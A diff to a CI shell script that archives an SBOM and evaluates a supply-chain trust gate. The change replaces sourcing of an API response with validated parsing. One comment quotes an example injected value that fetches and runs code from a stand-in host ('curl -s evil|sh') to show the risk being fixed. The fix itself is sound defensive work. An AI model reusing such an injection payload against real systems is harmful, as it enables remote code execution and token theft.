@@ -18,14 +18,25 @@ COMMIT_SHA="$(git -C repo rev-parse HEAD)"
 # Keyed on the file existing rather than on repeating the "should we build one"
 # condition. Two copies of the same condition is how they come to disagree, and
 # the failure mode is a curl against a file that is not there.
+# Archiving is best-effort and must NOT be able to suppress the evidence record
+# below. In Actions these were two steps — "Archive the SBOM" and "Report
+# supply-chain evidence" with `if: always()` — so an archive failure could not
+# stop the report. Collapsing them into one script under `set -e` lost that
+# independence: a 5xx from /api/ingest/raw aborted the script before the
+# /api/ingest/atlas POST, leaving stale evidence and no sign of it. Restored
+# explicitly.
 SBOM_REF=""
 if [ -f sbom/sbom.json ]; then
-  SBOM_REF="$(curl --fail --silent --show-error --max-time 60 \
-    -X POST "${MYKRONOS_INGESTION_URL}/api/ingest/raw?scan_run_id=${BUILD_ID}&filename=sbom.json" \
+  if ! SBOM_REF="$(curl --fail --silent --show-error --max-time 60 \
+    -X POST "${MYKRONOS_INGESTION_URL}/api/ingest/raw?scan_run_id=${BUILD_ID:-unknown}&filename=sbom.json" \
     -H "Authorization: Bearer ${MYKRONOS_INGESTION_TOKEN}" \
     -H "Content-Type: application/octet-stream" \
     --data-binary @sbom/sbom.json \
-    | python3 -c 'import json,sys; print(json.load(sys.stdin).get("raw_output_ref",""))')"
+    | python3 -c 'import json,sys; print(json.load(sys.stdin).get("raw_output_ref",""))')"; then
+    echo "WARNING: could not archive the SBOM. Continuing so the evidence record" >&2
+    echo "still lands — it will simply carry no sbom_ref." >&2
+    SBOM_REF=""
+  fi
 fi
 
 # ── Is this build a release? ──────────────────────────────────────────────────
@@ -102,37 +113,75 @@ curl --fail --silent --show-error --max-time 60 \
   -H "Content-Type: application/json" \
   -d "${BODY}" > evidence.json
 
-python3 - <<'PY' > evidence.env
-import json
+# ── DO NOT SOURCE THIS RESPONSE ───────────────────────────────────────────────
+# The first version wrote `KEY=value` lines and ran `. ./evidence.env`, which
+# executes the ingestion API's response body as shell: a field containing
+# `0\nX=$(curl -s evil|sh)` runs in this container, which holds the Mykronos
+# token. PD-6 — fetched content is data, never instruction. The Actions original
+# read the same six fields with `jq -r` into variables, so the port introduced
+# this.
+#
+# Values are now read positionally and each is validated against the shape it is
+# meant to have. A response that does not match is a broken or hostile server,
+# and either way must not degrade quietly into a gate that cannot fire.
+#
+# The parse runs in its own command substitution with its exit status CHECKED.
+# Inlining it directly into the here-doc below does not trip errexit, so a
+# rejected response produced six empty variables and the gate silently could not
+# fire — the validation reported the problem and nothing acted on it.
+if ! PARSED="$(python3 - <<'PY'
+import json, re, sys
 
 doc = json.load(open("evidence.json"))
+NUMERIC = re.compile(r"^-?\d+(\.\d+)?$")
 
 
-def shell(value):
-    # JSON booleans and nulls do not survive a naive str(); the comparisons
-    # below are string comparisons and have to be given strings they expect.
-    if value is True:
-        return "true"
-    if value is False:
-        return "false"
+def scalar(key, kind):
+    value = doc.get(key)
+    if kind == "bool":
+        text = str(value).lower()
+        if text in ("true", "false"):
+            return text
+        print(f"ERROR: {key} is not a boolean: {value!r}", file=sys.stderr)
+        sys.exit(1)
     if value is None:
-        return ""
-    return str(value)
+        # Absent numerics are reported as a sentinel rather than "" so the
+        # comparisons below cannot silently become no-ops on a schema change.
+        return "none"
+    text = str(value).strip()
+    if not NUMERIC.match(text):
+        print(f"ERROR: {key} is not numeric: {value!r}", file=sys.stderr)
+        sys.exit(1)
+    return text
 
 
-for key in (
-    "trust_score",
-    "min_trust_score",
-    "below_minimum",
-    "blocking",
-    "dependency_count",
-    "vulnerable_dependency_count",
-):
-    print(f"{key.upper()}={shell(doc.get(key))}")
+print(
+    scalar("trust_score", "num"),
+    scalar("min_trust_score", "num"),
+    scalar("below_minimum", "bool"),
+    scalar("blocking", "bool"),
+    scalar("dependency_count", "num"),
+    scalar("vulnerable_dependency_count", "num"),
+)
 PY
+)"; then
+  echo "ERROR: the ingestion API response did not parse as expected." >&2
+  echo "The supply-chain gate cannot evaluate, so this is not a pass." >&2
+  exit 1
+fi
 
-# shellcheck disable=SC1091
-. ./evidence.env
+read -r TRUST_SCORE MIN_TRUST_SCORE BELOW_MINIMUM BLOCKING \
+        DEPENDENCY_COUNT VULNERABLE_DEPENDENCY_COUNT <<EOF
+${PARSED}
+EOF
+
+# Absent numerics arrive as the sentinel "none" rather than "", so a schema
+# change cannot quietly turn the comparisons below into no-ops.
+if [ "${TRUST_SCORE}" = "none" ] || [ "${MIN_TRUST_SCORE}" = "none" ]; then
+  echo "ERROR: the ingestion API returned no trust score or no floor." >&2
+  echo "The supply-chain gate cannot evaluate. This is not a pass." >&2
+  exit 1
+fi
 
 echo "Supply-chain trust: ${TRUST_SCORE}/100 (${VULNERABLE_DEPENDENCY_COUNT} vulnerable of ${DEPENDENCY_COUNT} dependencies)"
 echo "Repository floor: ${MIN_TRUST_SCORE}"
